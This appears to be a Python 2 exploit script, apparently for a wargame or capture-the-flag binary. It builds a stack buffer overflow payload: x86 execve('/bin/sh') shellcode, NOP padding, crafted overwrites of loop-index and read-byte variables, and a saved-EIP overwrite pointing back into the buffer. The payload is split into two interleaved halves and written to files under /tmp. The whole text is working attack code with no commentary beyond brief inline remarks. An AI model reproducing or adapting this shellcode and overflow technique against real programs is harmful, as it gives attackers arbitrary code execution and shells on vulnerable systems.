import struct
import sys

def encode(data):
    exp1 = ""
    exp2 = ""

    for i in range(0,len(data),2):
        exp1+= data[i]
        exp2+= data[i+1]

    return (exp1,exp2)


shellcode ="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

payload = shellcode.ljust(64,'\x90') # total 64
#payload = "A" * 64
# 8 bytes to skip through idx1 and idx2, it will be getting overwritten anyway
payload += "\x00" * 8
payload += struct.pack('<I',0x000000ff) # read_byte1
payload += struct.pack('<I',0x00000000) # read_byte2
payload += struct.pack('<I',0x55555555) # make idx continue the loop 

payload += "A" * 12 # Junk
#jump back to the given buf addr
payload += struct.pack('<I', 0xbffff29c) # EIP 

exp1,exp2 = encode(payload)
file("/tmp/exploit1",'w').write(exp1)
file("/tmp/exploit2",'w').write(exp2)




